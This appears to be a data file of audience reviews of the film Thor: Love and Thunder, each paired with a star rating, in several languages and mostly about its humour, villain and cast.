"This was such an epic let down. The potential of many character here was absolutely wasted, and I can't understand how Crowe, or Bale were ever on board with this. It's odd too because Ragnarok was such an amazing film. Personally I think creative decisions were made rashly over content (which appears almost completely discarded), as the story is a mess. Some parts work (primarily those with Bale or Portman), but Waititi's inclusion of himself in this film as the comic relief was starting to become stale, as was the goat bit. The culmination also did not leave me with much to look forward too, but that remains to be seen.",2
"We all thought Chris Hemsworth was done and hung up his beloved hammer as the God of Thunder Well not quite‚Ä¶Thor is back and searching for who he wants to be rather than what he should be; more of finding self-actualization Taking place after the events of ‚ÄòAvengers: Endgame‚Äô and returning Kiwi director Taika Watiti Thor decided to leave Earth along with the Guardians of the Galaxy to find his true purpose And who should he run into while on this journey of self-discovery? None other than his ex-girlfriend Jane Foster played by Natalie Portman! It‚Äôs officially been 8 years since they saw each other but parted ways (off-screen too since Portman made it clear the first two Thor movie did not do wonders for her or her career) Now Jane is back but most amazing of all is that now she can possess the power of Mjonjir!!! She has become Lady Thor Also a new enemy named Gorr the God Butcher is set out to kill the gods and Thor along with Korg and Tessa Thompson as Valkyrie who became king of New Asgard on Earth re-unite to stop it They even come across Zeus himself played by Russell Crowe for help This 4th entry of the God of Thunder is a lot of fun much like ‚ÄòRagnarok‚Äô though it might be trying too hard to emulate it The opening has Christian Bale as Gorr in a desolate wasteland having his daughter die in his arms When the god his people worshipped appears and shuns him Gorr becomes vengeful He then takes up a dark blade called the Necrosword He even seeks a being called Eternity that'll grant any wish We find out Jane is actually dying from stage 4 cancer and seeks a cure New Asgard has turned into a fruitful tourist attraction with Valkyrie working with public relations and endorsements as well Taika Watiti still brings that lovable silly attitude with dozens of slick jokes and humor The film even acts as a silly romantic comedy of having Thor and Jane butt heads along with each of their weapons getting jealous of one another but also reflecting on how they both grew apart over time The music choices with Guns N' Roses add a nice layer with gods and punk/metal rock style None of us know how long we have, never helps to close ourselves off, should we believe in gods even if they never show up?, maybe there's no eternal reward, love is all what we truly seek, we should keep our hearts open Really love how Portman as Jane gets a proper treatment with her character getting a second life and Thor finding closure with himself learning to not shut himself off anymore Valkyrie is lovable as always missing the battles of old and Korg providing the tales of their adventures even recalling what audiences aren't familiar with Gorr you do feel sympathy and he's a scary looking villain, yet he comes off at times just a cookie cutter bad guy just killing for the sake of it and barely showing up Crowe as Zeus is way more flamboyant and hilarious than the dignified god we‚Äôre used to in mythology There‚Äôs amazing set pieces and color schemes that stand out The ending is quite a bittersweet one too for both leads tying up loose ends Watiti can't quite better himself past ‚ÄòThor: Ragnarok‚Äô but you can tell he still has a flair for the silly, goofy out of this world feel making the MCU bigger, brighter, flashier, and more colorful Laughs, action, terrific art direction, and colorful characters are gladly plentiful in this chapter of the Marvel Cinematic Universe despite some shortcomings The mid credits scene looks like it'll set up more battles ahead for Hemsworth due to his stubborn actions as this character For some there might be tonal shifts and too much emphasis on comedy but this movie in particular isn‚Äôt afraid to be full of levity without being too overly self-serious for the God of Thunder",4
"The worst Thor film, was more like a comedy spoof film, and Marvel shoving the woke stupidness down our throats again, we don't need to know that Corg had 2 Dads or that Valkyrie is in to Women and refers to herself as ""King"" instead of Queen. Nonsense.",2.5
The cgi is pretty mid and the plot is quite boring and childish,3
"I had a good time seeing Thor: Love and Thunder. Chris Hemsworth did an amazing job as Thor and Tessa Thompson as well. There are three things I loved this movie was the comedy, the action, and the one and only JANE FOSTER aka THE MIGHT THOR!!!! I thought Natalie Portman did an awesome job portrayed the character, I haven‚Äôt read the mighty Thor comics but I found very concerned. At the end of the day, she is my top 10 MCU characters of all time. The rest of the movie was ok, the problems I had was the writers. I know Taika Waititi was the co-writer of this movie, the Oscar winner for best screenplay in ‚ÄúJojo Rabbit‚Äù, I think he did a little too much for making a lot of jokes. ‚ÄúThor: Ragnarok‚Äù is my favorite Thor movie. I loved Christian Bale as the villainous Gorr the god butcher. Overall it was enjoyable movie!! Definitely can‚Äôt wait to see what‚Äôs next for Thor.",3
"It had some fun moments, and Portman is a gem, but overall is junk. I thought Ragnorok was brilliant and pitch perfect, and is still one of my favorite Marvel movies, but in this one Watiti seems to phone it in, ending is tedious.",2
"Unica nota di positivo del film √® la presenza di Christian bale , finito",2.5
"After the shift in theme and tone of Thor: Ragnorak, I was pumped to see what Taika Waititi would do with Thor: Love and Thunder especially when it was said that Natalie Portman would return in her role as Jane, the Guardians of the Galaxy would be appearing, and Christian Bale would be playing the villain! Who knew the apple could fall so far from the tree, Waititi takes what was great about Ragnorak and doubles down on everything, especially the comedy. The movie sets itself up to be a great and compelling movie as the introduction of Gorr and the opening sequence with the Guardians was great. And about after 15 or so minutes, the Guardians are gone, and the film goes about downhill from there. The movie insists on placing these untimely jokes every few minutes which by not even the halfway mark in what is a movie that just barely scratches the surface of two hours ends up getting annoying and leaves you waiting for the movie to end. Chris Hemsworth is great as always as I think he has been great in the role since the beginning and has adjusted to so many different iterations of the character and Christian Bale gives the best performance, he can with the poor script he was given. The movie like other Marvel films relies heavily on CGI which is very poorly done in this film. Taika Watiti as good as Thor: Ragnorak was, might be a one hit wonder, at least in the MCU.",2
"This film is a case of having a great idea, great cast, and great antagonist ruined by too much humor. I would say the best part of the movie was Gorr, who was the only serious part of the whole project.",2.5
"Bad movie, entertaining but cheep story",1.5
One of the worst marvel movies,2.5
"‚ù§Ô∏è‚ö°Ô∏èüê¨üòÖ I find it to be a pleasing parody of the hypocritical superhero genre. Stupid jokes, awesome visuals, fun soundtrack and silly love story. It gave me what I genuinely expected, without trying to overdo it like most of the MCU and superhero movies do. To me TaikaW emphasized the SH industrie's natural emptiness. Just sit back, relax and have fun üòâ",5
"It doesn't even feel like the MCU. From screaming goats to split kicks, this movie is overall wacky in an awful way.",0.5
"Esse filme foi uma das maiores decep√ß√µes q j√° tive, desperdi√ßaram um vil√£o incr√≠vel e um ator excepcional. Pegaram duas das hist√≥rias mais √©picas dos quadrinhos do Thor e transformaram em uma com√©dia ruim.",1
"Movie is just focused on comedy and not actual story telling. Also, movie kills one of the new characters that could have been used to make this film better.",1
"Not worth the time to see it. If you go to a dark room whit nothing happening, you at least get a better time.",0.5
"""Thor: Love and Thunder"" presents an interesting story that unfortunately suffers from a rushed and shallow execution. The narrative takes numerous shortcuts, resulting in a lack of depth and a missed opportunity to fully explore its potential. The humor, while initially entertaining, becomes repetitive as similar funny moments are recycled throughout the film. Christian Bale delivers an outstanding performance, yet regrettably, his talents feel wasted within the confines of the screenplay. On the other hand, the remaining main cast members give commendable performances, doing their best to inject energy into the film. Overall, ""Thor: Love and Thunder"" showcases glimpses of promise, but falls short of its potential due to its rushed narrative and missed character development opportunities. It leaves one wishing that Taika Waititi had put more effort into crafting a more cohesive and fully realized film.",3
I wanna love this movie but it was overly funny and didn't have enough guardians but it was sad and had great great scenes,3
Almost a comedy film. Cringey punchlines.,0.5
Worst movie of the MCU!!! It's not even close. Special shout out to Justin. May you live forever,0.5
Good and fun but easy to predict,3.5
Thor: Love and Thunder just cant be a comedy movie with a Gorr as the main villain.,1.5
Yes wasn‚Äôt as good as I thought,2.5
Great movie! This is probably one of the better movies from the MCU personally.,5
Flat out cinematic garbage,0.5
Good story and lots of fun. Killer performances by the leading actors (especially Christian Bale) and a stellar soundtrack as well. A little less camp would have made it perfect.,4
"It was ok, could have done with a little less turning Thor into a comic relief, but that's the way the studio is going I guess.",2.5
Extra star because it had heart,4
Love this movie!!!!!!!!!!!!,5
"Thor: Ragnarok was a fun, yet serious film that took Thor as a character in a whole new direction, But Thor: Love and Thunder seems to acknowledge it's predecessors success, and goes harder on everything that made Ragnarok good, and ends up being unfunny, having questionable (At times) CGI, Gor (Christian Bale) being an intimidating yet lacklustre villain and awful diologue, makes Thor: Love and Thunder one of the worst entries in the MCU yet.",1
Resumindo em um palavra: Constrangedor. üëé,1
"It was glow down from Thor: Ragnarok. Definetely it was to short, the story didnt have time to unfold, story of Jane should be so sad but it wasn't and i didnt even have one tears in my eye. Antagonist promised to be epic but again, the dont have enought screen time to show us his power, and this ending... One of the worst for me from all of franchise",2
The greatest 02 hours: and 05 minutes ever!!!!!!!!!!!!!!!!!!!!!!!!!,5
Ngl it was pretty hard to watch and I was expecting more from gorr since I thought his gonna give problems to Thor,0.5
"It was ok, nothing spectacular which was disappointing",3
"Truthfully, I loved it. I know I'm in the minority. I truly loved Jane in this movie. I was definetly in the mindset before that the best thing they did to Thor was get rid of Jane. I really did not like her before. This movie really turned that around for me, however. I really love what they did with her here and the implications going back to the older Thor movies. As for Korg - I do think he should have died in this movie. It was a bit odd that he survived. As for Gorr - I loved how he was portrayed. Definetly one of my favourite MCU villans portrayal-wise, although he was also definetly the weakest link movie-wise. This was because of the SHEER underuse of Gorr. He is called THE god butcher, yet we see him kill exactly one (1) god, with all others conveniently killed off-screen. Gorr could have been so much more - we could have seen some incredible fights, especially in the scene where all the gods had gathered for Zues. That was such an incredible set up for a Gorr the god butcher attack scene, but nothing. Aside from this wasted potential, however, I loved the movie. I suppose it was a ""Thor"" movie, not a ""Gorr"" movie, so we did not follow Gorr as he supposedly killed all these gods in such incredible ways that we will never see.",4
Maybe the worst Thor movie of them all. To goofy and joking and not enough acting.,1
"The weakest of the franchise. I think the story was weak and boring. I did like the goats, pretty funny. Hope the next one has a better story.",2.5
dont like it :-( the humour its too much,2
"They've made a joke out of the franchise! why, why, why.....",1
Maior decep√ß√£o que j√° tive em filmes.,1
It is the worst one yet I have no words‚Ä¶,1
It was too much of a comedy and way too much Guns n Roses.,3
The film was ok. The problem is that it was sometimes so goofy that it was unwatchable. The super fun tone didn't fit the deep and emotional storyline. They tried to do a lot in a short time span. Phase 4 continues to be a head scratcher.,1.5
I felt this movie to not be as fantastic as some of the other Thor movies . I also felt some of the serious scenes in this movie were ruined because of trying to be funny too much at times .,3
This movie was almost horrible they ruined Zeus and they ruined gorr the god butcher they did not show gorr killing the gods and thsy made zues fat and non godly Thor gave kids superpowers which was so cringe to me and all of those ugly kids made the movie worse and i didn‚Äôt like Jane froster Thor she thought she was all that but she wasn‚Äôt she should have died early in the film this movie should have been just like the comic I regret watching this movie,0.5
I would normally give a movie like this 2 stars but read I read the God Butcher comic which was so amazing and this is a joke. I hated every minute of it. It was bad plus they ruined a comic story.,0.5
"This show was the most disappointing sequel I've ever seen. The stark contrast to Thor Ragnarok undoubtedly made the shocking lack of skill displayed it's making all the more painful, but even as a standalone film, it is a failure. The idea of Jane Foster being imbued with Thor's powers is awesome and then the writing and direction took a massive dump all over it.",0.5
It was ok. Hate that they make Thor look dumb,2
"Not the best Marvel movie, but it was fun to watch.",3.5
My least favorite Thor movie. Not sure if they were trying to make a comedy or not. It just fell flat.,3
I love how they made 2 thors awesome!!! Yasss but when I watched the movie I couldn‚Äôt pay any attention to the plot because of Chris and his marvelous body like oh my god and I watched this on PRIDE MONTHHHüè≥Ô∏è‚Äçüåàüè≥Ô∏è‚Äçüåàüè≥Ô∏è‚Äçüåàüè≥Ô∏è‚Äçüåà YASS SO GOOD THIS MOVIE HAD ME DROOLINGGGGGGG,5
que verguenza de pelicula humor mediocre e infantil actuaciones y dialogos tontos que perdida de tiempo.,0.5
"P√©simo gui√≥n, pesimos desarrollos de personaje, thor es un pendejo y valkyria me da cringe.",0.5
"The movie was just meh. The looks of it were alright but the story and characters just weren't amazing. There were deleted scenes that they definitely should have kept in the movie because it truly needs them. Some of the scenes were to goofy even for a thor movie which I personally didn't like, but also were just to goofy to make sense. I'm am going to praise gorr, aside from his unneeded redemption, he was an amazing character and Christine bale did a good job.",2.5
"Boring movie, the worst of the 4 Thors.",2
Taika waititi created cringe with star cast. The characterisation of the every character in this film is too weak and worst. Waititi made Christian Bale (Gorr) a child kidnapper.,1.5
"I'll be honest. I went into the movie with extremely low expectations. The story is based on poorly written comic book arc created for the sake of controversy marketing. As such, I expected it to be heavy-handed, on-the-nose and kind of preachy. I'm pleased to say it wasn't. I'm also pleased that they didn't really call Natalie Portman's character Thor until the very end. This was the specific point of contention for most Thor fans in the comics - it wasn't so much that a woman was wielding Mjonir and its power. There have been other protagonists to do so. The problem was that they called her by HIS name, which is not how that's supposed to work. ""Whoever holds the hammer shall posses the POWER of Thor"" not ""whoever holds the hammer BECOMES Thor."" Had they simply given her a different name, I don't think there would have BEEN such a visceral reaction, and I think that Marvel knew that, counted on that, and leaned into that controversy to grab headlines. But, I digress. As I said, her name wasn't really pushed in the movie. It didn't have that cringey ""cash-in on a social movement"" feel you might expect to see going into it. One complaint I did have is that it continued Ragnarock's silliness, which I didn't really care for. The character doesn't need to be all grim-and-gritty all the time; he's not the Punisher, and big celebrations and jovial moments have always been part of the portrayal of Asgardians. Still, at times the last couple of movies have made Thor seem downright clownish. Still, there was fun to be had, the action was good, I had zero complaints with any of the performances, overall it's fine. One last story-point complaint however, ENDING SPOILER AHEAD: So the God Butcher went through allll that to bring back his daughter, and then was all weepy because he was dying, and wouldn't be there to watch over her? HEY DUMB-DUMB! You've got what appears to be a no-limits wish. You can't POSSIBLY be thinking that small. Repeat after me ""I want to live a long, happy life with my daughter."" There. Now she's back AND you're not dying AND your life together will be happy. easy.",3
"Good, but the worst do the Thor‚Äôs movies.",3.5
a tremendous bad joke with the character and his history in the comics. Taika made these last 2 films his private amusement park.,0.5
"Most outrageously bad Marvel movie of them all. Bad jokes. Bad depictions of characters. Lousy villain story buildup. Taka Wakiki or whatever, worst director ever. The script is pure garbage.",0.5
Um filme que se perde no romance e na com√©dia! Deixou a desejar...,3
"Much better than the first two of the Thor series; on par with Ragnarok. I appreciated that this was a self contained film that didn't connect with the multiverse series. My only issue is that we got less Gorr than I would've expected, and I wished for a bit more inclusion of the Guardians of the Galaxy to shed some light on those journeys together. Ultimately this has some high rewatch value on third and fourth viewings.",4
"The film is a parody, unfortunately not a funny one, at least not, if you have a minimum standard of quality. The fact that Hemsworth himself said he would only come back, if the next film was a drastically different version, says it all.",1
Was boring and most of the jokes fell flat.,0.5
Yeah this film sucked,0.5
How do you waste Christian Bale?,1.5
"enjoy the tongue in cheek humor, as well as all the cameos (Matt Damon and Melissa McCarthy)...although I wouldn't pay to see these, willing to see them for free!",3.5
It is just okay. Introduces to other Gods in the MCU besides the Norse ones. Christian Bale is playing a villain who has never really been iconic which is a shame.,3
Some people have been far too harsh on this movie. My only complaint was the treatment of Gor. Everything else was amazing,4.5
Not as good as the Thor movies. The action is pretty good but the story is seriously lacking. It just didn‚Äôt make any sense.,2
"The story is a little disjointed, and Thor's motive here is kind of nebulous and childish. I get that he's not the sharpest tool in the shed, but this honestly felt like a Christmas Special sort of film: satirical characterization for some cheap laughs. But maybe that's giving it too much credit because even the GOTG christmas special was better than this. And the tone was... all over the place. Was this supposed to be serious and compelling or just whimsical and fun? Honestly, I couldn't tell you. It seemed to trend more towards the latter - which sucked because here you have Christian Bale acting his damn heart out only to be relegated to some quips and cheap shots by several deus ex machinas and a hammer or two. Meh. Maybe a decent weekend flick on streaming?",2.5
"Depois que a Disney colocou os dedos a marvel acabou nos cinemas, am√©m pelo Ultimato antes da Disney come√ßar a lascar com tudo. UCM morreu no Ultimato praticamente. Fico triste pelo Bale, mas infelizmente mesmo tendo sido impec√°vel no filme, nem ele consegue salvar esse roteiro de cinderela.",0.5
Too goofy stupid to be a good Thor movie. Relying on good will from past Thor movies. Junk. Acting was phony.,3
"They just wasted Gore üòë Nothing brilliant, colorful, one-time watchable. Could have been really good . Just wasted an all time best & a potential antagonist",0.5
"At this point, Marvel movies like these are what keep me going, even if they forget to give the villain enough screen time, or if the plot drags on into the third act. Not to mention the god-awful CGI. This movie is fun, and it doesn't overstay its welcome.",3.5

They have turned Thor into an utter buffoon,1.5
Would give zero stars if I could. They ruined Thor. The beginning fight scene was a joke.,0.5
"Not as good as the ones before it. Worth a watch to see the relationship, but otherwise I wouldn't watch it a 2nd time.",3.5
"It was fun. A bit too goofy at times, but kinda funny at the same time.",3.5
"Loved Ragnarok, but almost turned off this one halfway through... Terrible marvel movie!",1
"This film is fun, but the jokes don't land and everything is treated like a joke.",3
"These are one of the newer marvel films that make viewers more bored. This film had less action, more talking, many unnecessary lines, and was genuinely disappointing.",2
Marvel has a problem with taking their characters serious as of lately. This is another movie with a great villains but is being held down by a goofy movie. Take Thor serious again.,3
It was entirely too campy for any kind of consice storyline. It seems like marvel is losing their way on some of the character's journeys.,1.5
"Thor is always a funny one in the Marvel movies. Their previous movies are really good and fun to watch. however, this one is really hitting the bottom really hard. The story is good actually, but the way it comes in the movie is just horribly bad. It's very disappointing",3.5
I don't know if this movie left a horrible taste in my mouth or rather no taste at all. Thor continues to be dumbed down further for his solo appearances. The movie had a phenomenal story in there but refuses to let it shine. Janes story is so full of emotion but the movie won't let the audience feel even a shred of emotion before cutting a humorless and tired joke in there. This results a very dull ending. The God Butcher played by Bale also has so much potential but all the god butchering is done off screen and his character is left to terrify children for no reason and follow through with a plan that shouldn't even work with his view of gods. This movie was a complete waste of story. Wish I could have gotten that time back.,0.5
Worse MCU movie I've had the pleasure of watching. Disney NEEDS to go away ASAP!!!,1
"It was a great movie. but would've been even better if Thor and his hammer/axe 'love triangle' was done once and moved on to something more interesting, like Christian Bale's character.",4
"Taika Waititi gives us a jumbled-up assault on the senses that has no idea what it wants to be. The only redeeming qualities here are Natalie Portman and Christain Bale, although there could be a lot more of him.",1
"While watching the movie, I found myself zoning out several times - which I have never experienced during a Marvel movie. The humour was bad. The movie in general was unimpressive.",2
Most viewers did not understand= this movie is a story being told by a foolish character to a bunch of kids= the story according to HIS perception of what happened and that was too deep for most fans to understand- the only thing the director did wrong was not to show him telling the kids the story a few more times and maybe the kids looking kind of skeptical at what is being told to them-then it would have been a WAY bigger hit,5
its okay. Its like its trying to have that Thor Ragnarok charm but it has this overall vibe of being kinda cringe...,3
I liked it better than Ragnarock. It was a much more linear storyline with clear themes told in entertaining ways.,5
"they did my boy Thor dirty in this film + the movie tries to be a comedy but fails at it horribly (the jokes with the screaming goats is one example of many) and you cant tell me mighty thor is better than thor at everything besides thir having 1000 years more experience at being a god. the dialogue is horrendous ""eat my hammer"" what the heck is that!?",2.5
"This movie wasn't terrible. People be hating on this movie but it's actually pretty good. The villain is great and the effects are pretty good too. While the story and some characters are forgettable, enjoy it while you're there. Marvel isn't getting any better but this project is better than She-hulk and stuff like that‚Ä¶..if you want to watch new marvel, why not watch this???",3.5
"Not as good as Ragnarok but still a really good film. We get even more LGBTQ+ representation which is very refreshing. There's lots of fan favourites, Christian Bale is great, very funny and heartwarming moments. Definitely recommend.",4
"This movie is soooo silly. It's ok, fun but to silly at some parts. Perfect to pass time.",3
"I was hoping for another Thor: Ragnorok and got a movie trying too hard to mimic that movie. The tones are constantly clashing with this movie and you can never take it seriously like it wants you to at times because of the constant jokes that rarely land. The villain is defeated despite Thor, not because of him. The Mighty Thor could be cool, but no effort is made to set up her new abilities which makes it hard to buy in the context of the movie. Overall, this movie was not worth my time.",1
I liked this movie but the biggest problem with this movie is that it relied a lot on the Jane Foster character and I do not think Natalie Portman is that good of an actress.,3.5
"This is yet another weak entry in Marvel's growing mediocrity. It gives no care to Thors arc at all in exchange for a couple of quick laughs. Speaking of, the comedy here is way over done and stops working quickly because of it. This is especially disappointing when the villain is Gorr. Gorr is completely wasted in this movie, he doesn't fit with the comedic tone and often feels out of place. Christian Bale's performance is definitely not the problem, he is doing an exceptional job. The problem is the film he is trapped in. Overall the comedy here completely ruins the movie. The plot is incoherent and inconsistent at times, and the villain is in the wrong movie.",2.5
The worst movie in the MCU,0.5
"im surprised this got as high as it did, I thought it was terrible, probably the worst thor movie",3
Ready for the next phase from MCU.,3.5
"In my opinion, it's one of the worst Marvel movies. The characters are flat; the plot is just childish. Was it made using the flattest prompt on Chat GPT?",1.5
"A film that would have been at the beginning of this universe, nobody would have wanted it.",1
A ridiculous film that didn't need to be made and only serves to cheapen the overall brand.,2
"very weak movie, exaggerated jokes",2
"Not good. Most of the humor was lame...and strange. Was very difficult to take the movie seriously. Story line was ok. Soundtrack was good! Unfortunately, another fail for Disney and the MCU.",2
Nada n√£o √© assim que se estraga um personagem.,3
could have been better,3.5
They should rly warn if a movie is made specifically for kids under 6 years old. It felt like an unfunny live remade of the Wild E Coyote cartoons.,0.5
This movie sucks. The comedy is bland and way overdone. Christian Bale's performance is the only good thing about the movie,0.5
I really did not like this movie,0.5
Not good at all. The acting at times was very cheesy! The worse Marvel movie ever done. Very disappointing !,1.5
It was ok no the best,3.5
This movie annoyed me so much. Made Thor look like a none threatening idiot. He was handled in infinity war the best.,1.5
"una pelicula que cumple a medias, pero se deja ver, se perdio el rumbo y deberian de darle un final al thor de este actor y reiniciar la saga con nuevas historias",3
"This felt like a movie for exclusively kids; especially the action scenes. The movie was fun but extremely forgettable. It was weird to go from the previous Thor movie that felt extremely consequential, to this‚Ä¶ a movie that felt inconsequential and engineered for kids.",3
"Marvel √† l'habitude de faire des bon films, avec des sc√®nes post-g√©n√©riques qui nous tiennent en haleine. Thor: Love and Thunder est un film qui √©tait attendu, mais l√†, on touche le fond. Ils ont essay√© de m√©langer tout ce qui avait r√©ussi dans les derniers Marvel, mais √ßa n'a pas fonctionn√©, il fallait s'y attendre. Apr√®s quelques films et/ou s√©ries rat√©, Marvel tente de se sauv√© en r√©alisant la suite de la trilogie qui avait march√©, sans succ√®s. De plus, la sc√®ne post-g√©n√©rique du film est juste ridicule. Elle ne donne pas envie de voir la suite et pourtant les sc√®nes post-g√©n√©rique √©tait leur sp√©cialit√©s, leurs marques de fabriques. S'il fallait qualifier le film en un mot : d√©cevant.",1
"So it's Thor chris hemsworth etc it's a watch, but it's lack lustre don't go into it with high hopes, Christian bales performance was robotic in the sense of it seems like cuts of different gorr emotions, janes cancer story was beyond rushed and unsympathetic, somewhat confusing story even more confusing ending, defo watch but don't retain!",3
"Definitely one of Marvels weaker movies though I still enjoyed it, Christian Bale was definitely a highlight of the movie and I enjoyed other little bits in it, but overall definitely not one of the MCU's best. It was fine. That's all I can really say.",3
"Boring, the one before was better.",2
Might be the worst mcu movie ever made. I have no idea how taika watiti went from making one of the best mcu movies (ragnorock) and then immediately makes the worst mcu film.,0.5
"I have watched a vast majority of the Marvel movies and I cannot claim to be a professional critic. That being said, as an audience member, this movie was perhaps the worst of the MCU I have seen. The movie opens with an incredibly powerful scene of a believer turning against a god that couldn't care less about them and the chaos ensues from there. We are given a partial origin to a powerful villain and promised an interesting and tantalizing tale of heroics, action, and the complexity of emotion present in intelligent beings. The rest of the film, however, does not deliver on that promise. The writing was terrible. The jokes were sub-par, at best. The entire thing felt as if it was nothing more than a poorly written comedy with some of the worst comedic timing I've seen. There was an opportunity here to see Thor in a more human light, to see what he was going through in the aftermath of all that had happened, and instead it does nothing more than turn grief into the butt of inappropriate jokes. Not only that but the handling of Jane's diagnosis, her newfound bond with Mjolnir, and her reuniting with Thor was sloppy at best. Let's not forget that Valkyrie wasn't even up to snuff in the film, either. Honestly, it felt like a juvenile-minded individual grabbed hold of what could have been an interesting concept and turned it into a middle school grade puppet show. The only thing that kept me interested in the film were the snippets where you get a chance to see the villain and his motivations because at least that was some modicum of maturity. Frankly, I wish I had never seen this movie and the fact that it's rated at 63% is far too high. Honestly, it is the worst MCU movie to date and I hope they don't make another one.",0.5
"Thor: Love and Thunder is the best thor movie to date. It kills off Jane, but the casting is PERFECT. They somehow got the actor from the new Batman to act as the villain, Gorr The God Butcher.",5
"Thor: Love and Thunder is a thrilling addition to the Marvel Cinematic Universe that manages to balance action, humor, and heart in a way that only director Taika Waititi can. The film's bold and colorful visuals are a feast for the eyes, and Waititi's signature irreverent style brings a sense of fun and playfulness to the proceedings. But it's not all just spectacle and laughs - the film also tackles deeper themes of love, loss, and identity in a way that is both moving and thought-provoking. Overall, Thor: Love and Thunder is a must-see for fans of the MCU and anyone who enjoys epic superhero adventures with heart and humor.",4
"Don't know what's going on with the movie, disorganized plot. Not persuasive enough!",3
They completely destroyed thor in this movie. Dear writers you can have strong powerful woman in your show without making the man a complete idiot,2
Not just the worst MCU movie but the worst movie of 2022. The dialogue is beyond juvenile. It blows my mind that this movie was approved. Thor was perfect in Infinity War and somehow they turned his character into a big buffoon.,0.5
"I would say it is one of the weaker Thor movies, but still a good movie. I would rank about 75-80%.",3.5
"I couldn't hate this movie more. Thor is reduced to being an idiot. It doesn't even work as a parody of itself. It mocks God and people of faith. It espouses the religion of the left. Audiences have largely rejected this movie for good reason. If Marvel continues in this direction they will ruin all they created. Ragnarok was a blast, this is trash.",0.5
"Ouch, this is nothing like the last two Thor movies. Lacking what the previous movies had.",1.5
"–ù–µ –ª–æ–≥–∏—á–Ω–æ, –≥–ª—É–ø–æ, –≤ —É–≥–æ–¥—É —Ñ–∏–º–∏–Ω–∏—Å—Ç–∫–∞–º",0.5
"It funny, it have good music and villain. 8/10",4
"""Bombastic, loud"" (in the words of writer-director Taika Waititi), and silly, Thor: Love and Thunder reaffirms that empty vessels make the most noise.",2
"This movie ruins Thor character, is full of stuff that doesnt make sense in the MCU has a whole and is just overall a bad time you need to get through if you want to understand the MCU since now everything is connected",0.5
Well where to start! Thor Love and Thunder should've had less love and more thunder. Not the average Thor movie. Love and Thunder was a sad following Ragnarok. Which Ragnarok was the best Thor movie yet!,0.5
One of the worst mcu movies. VERY disappointing. Pity that after brilliant Ragnarok Taika Waititi couldn't hold the quality level. I totally loved Thors character in Ragnarok and his transformation in someone more bad ass in infinity war. Endgame wasn't really bad but now you can see that's where the downfall of his character began. Hemsworth says hes not coming back to the role unless the tone shifts to something more serious. Maybe different director? I really hope so.,1
After watching trailer and some TV spots I'd thought this movie is going to be massive. But movie was totally trash. Star cast like Christian Bale and Russell Crowe were totally underutilized. Taika Waititi didn't succeed this time. It's a massive step down from Thor Ragnarok (2017). Most film in Thor Franchise.,1.5
"Goofy, funny, daft. Why shouldn't the MCU offer a lighter side? It helped my boy become an MCU fan, and for that this film will always have a place for me. Love it.",5
it was a pretty good movie a bit goofy and the ending was.... meh! and the guardings were only in the first 20 minutes of the movie!,3.5
"Wow, they really fumbled Thor and he may never recover.",1
"Christian Bale's character quite remarkable, heartfelt intense. Everything else was very unserious in its inappropriateness. Don't write like this again, don't direct like this again. It's made marvel no more than a joke.",2
I think there was way too many gags and way too goofy for a Thor movie. At least the previous movie had a serious nature and led up to Avengers Infinity War. This was just too much.,2
Another forgettable delivery in the MCU,2
If you skip all the talk between the couple and all this things of love etc.. The movie become really good.,4
Loved the movie for what it was however the portrayal of Gorr left me wanting more. Should have let it be R rated and let Gorr butcher some gods on screen. Still a great flick just not what was expected.,5
Probably my least favorite of the MCU. Sorry Taika. Maybe Ragnarok set the bar extremely high. I think I might have even liked The Eternals over this one.,1.5
Thor: Love and Garbage,1
"Too silly, and having two comic book themes competing (Jane as Thor, and Gorr the villain) diluted the impact‚Äîat least the way Watiti did it. In the comics, Jane's story was heart-rendingly sad and heroic. In the movie it felt only mildly sad and regrettable. I think the problem was not enough development of her story arc. I didn't feel invested in it. Christian Bale is a great anchor, but the way Gorr is represented weakens Bale's performance. The make-up choices felt weak, especially compared to the comic stories this movie was based on.",2.5
"No entiendo por que cada escena tiene que derivar en un chiste, solo le faltaban risas grabadas",0.5
"Pacing isn't great, action is dull but a cool addition never the less",3
"Taika waititi's version of Thor is starting to tire. It is an enjoyable comedy and action film but at times it is quite cringe. Bale does a good job as Gorr but has few scenes and doesn't feel like a ""god butcher"". Photography is the strongest point, the scene on the gray planet is cinema.",3.5
Two stars for every each galactic goats. that's all.,2
"Thor: Love and Thunder is packed full of action and bad jokes, to the point that it seems a parody of itself. Bale did a great job on the acting but since the movie does not take itself seriously, there is never a sense of actual danger, making everything kinda pointless.",3
Gorr The God Butcher Should Of Continue On As Somehow As A Villain.,3
Why? no need to make him a clown!,2.5
"It was cool. Loved Taika's influence. Had lots of sad parts. But I can't quite put my thumb on it but I kept feeling like there was something missing. Also, I wish they had explored more this idea of the other gods. Particularly when they go to Olympus. The fact they made this so brief was a total missed opportunity to develop into more.",3.5
it was a decent movie it wasnt that bad but the cgi was horrible and made me wanna puke this movie is mid.,3
A little weird on the vfx but in general good movie. A little funny. But just to continue with the MCU story we have to keep watching üòÇ,3.5
"While the ideas that were presented were great (some of them working really well), most of them fell under the weight of the overwhelming humor that felt like a recreation of Thor: Ragnarok.",2
It had a perfect amount of comedy and action. Some parts were hard to predict. The acting was great and it was probably one of the funniest Thor movie even though they should bring down the comedy.,3
"They've basically turned Thor into a joke. He has gotten so far away from the god of thunder. Failure to let us feel connected to she Thor. The best part of this was Christian bale, however they continue to put forth villains and kill them off so no attachments are formed and these movies continue to failure to have the impact that most other marvel movies have in the past.",2.5
Kind bad kinda bad kinda bad kinda bad kinda Kind bad kinda bad kinda bad kinda bad kinda bad,3
"I really want to like this movie (and mostly do) but there are a lot of missed jokes, awkward moments, and a bipolar tone in order to freely recommend (i.e. silly dialogue suddenly turns into serious cancer concerns within moments of each other). I sincerely appreciate the team trying to repeat the ‚Äòdon't take ourselves so seriously' humor and the retro vibe of ""Thor: Ragnorak,"" that movie saved the Thor series and is a tough act to follow up, it was received very well and one I thoroughly enjoyed too, but ""Love and Thunder"" struggles to hold itself up, leaning a bit too hard into goofiness making me genuinely surprised they didn't correct more errors during editing. They still made millions off of the film so it was a relatively wise move. Depending on your mood there is enough camp humor, Marvel flare, cast attraction, and storylines to want to see it through to the end, the relationship banter between Hemsworth and Portman (and the hammers) keep it alive, but otherwise it is a rather aimless and forgettable film, which to be fair most post-""Avenger: End Game"" MCU films are all sort of becoming this way as much as I wish it wasn't so (what can possibly be more climatic than saving the end of the universe?). If you're in the mood for something light and mostly fun (minus the heavier moments) it can provide for an entertaining evening.",3
This movie was one of the worst I have ever seen Thor was making jokes all the time unevolving from Ragnarock wich was one of the best Marvel movies.,0.5
